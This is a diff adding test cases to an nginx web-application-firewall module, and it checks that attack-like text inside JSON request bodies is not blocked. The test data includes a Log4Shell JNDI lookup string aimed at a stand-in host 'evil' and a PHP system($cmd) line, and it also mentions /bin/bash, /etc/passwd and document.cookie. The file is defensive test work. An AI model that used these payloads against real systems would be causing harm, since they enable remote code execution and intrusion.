@@ -347,3 +347,68 @@ GET /t?q=%ef%bc%8f
 --- request
 GET /t?token=abcu002fdef
 --- error_code: 200
+
+=== TEST 44: a CI script in a JSON body is not command injection
+# TESTS 44-47: the body-scan position rule. These tokens have no benign reading
+# in a request TARGET, and the categories still block them there (t/06 TESTS
+# 39-42). In a text/JSON BODY they are ordinary content -- a CI config, a
+# Dockerfile, a consent banner, a blog post about Log4Shell -- so the
+# categories that own them carry NGX_HTTP_SHIELD_NO_BODY.
+--- config
+    location /t { shield block; shield_body on; empty_gif; }
+--- request eval
+"POST /t
+{\"script\":\"#!/bin/sh\\nmake test\"}"
+--- more_headers
+Content-Type: application/json
+--- error_code: 405
+
+=== TEST 45: a Dockerfile paste naming /bin/bash is not command injection
+--- config
+    location /t { shield block; shield_body on; empty_gif; }
+--- request eval
+"POST /t
+{\"dockerfile\":\"SHELL [\\\"/bin/bash\\\", \\\"-c\\\"]\"}"
+--- more_headers
+Content-Type: application/json
+--- error_code: 405
+
+=== TEST 46: consent-banner JavaScript reading document.cookie is not XSS
+--- config
+    location /t { shield block; shield_body on; empty_gif; }
+--- request eval
+"POST /t
+{\"js\":\"if (document.cookie.indexOf('consent') < 0) show();\"}"
+--- more_headers
+Content-Type: application/json
+--- error_code: 405
+
+=== TEST 47: a blog post ABOUT Log4Shell is not a Log4Shell attempt
+--- config
+    location /t { shield block; shield_body on; empty_gif; }
+--- request eval
+"POST /t
+{\"post\":\"Attackers sent \${jndi:ldap://evil/x} in the User-Agent.\"}"
+--- more_headers
+Content-Type: application/json
+--- error_code: 405
+
+=== TEST 48: a code-review body containing PHP source is not php_rce
+--- config
+    location /t { shield block; shield_body on; empty_gif; }
+--- request eval
+"POST /t
+{\"diff\":\"- <?php system(\$cmd); // removed, see CVE-2012-1823\"}"
+--- more_headers
+Content-Type: application/json
+--- error_code: 405
+
+=== TEST 49: a docs body naming /etc/passwd is not a sensitive-file probe
+--- config
+    location /t { shield block; shield_body on; empty_gif; }
+--- request eval
+"POST /t
+{\"doc\":\"User accounts are listed in /etc/passwd on Unix.\"}"
+--- more_headers
+Content-Type: application/json
+--- error_code: 405
